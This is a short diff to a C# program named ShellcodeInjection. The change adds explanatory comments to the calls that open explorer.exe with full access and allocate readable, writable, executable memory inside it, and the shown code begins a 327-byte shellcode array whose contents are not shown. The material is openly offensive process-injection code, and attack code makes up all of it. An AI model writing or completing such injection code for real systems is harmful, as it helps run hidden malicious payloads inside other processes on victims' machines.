@@ -19,9 +19,9 @@ namespace ShellcodeInjection
         {
             // Find explorer.exe's PID from within Task Manager or other means and set it here.
             int explorerPID = 0;
-            // Set hProcess as the value of the OpenProcess
+            // Set hProcess as the value of the OpenProcess  Args: PROCESS_ALL_ACCESS, Can Child Process inherit this handle?, explorerPID
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
-            // Set addr as the value of the VirtualAllocEx
+            // Set addr as the value of the VirtualAllocEx ARGS: process, have API select an unused address, mem_commit, mem_reserve, page_execute_readwrite
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             // This is our shellcode of course
             byte[] buf = new byte[327] {
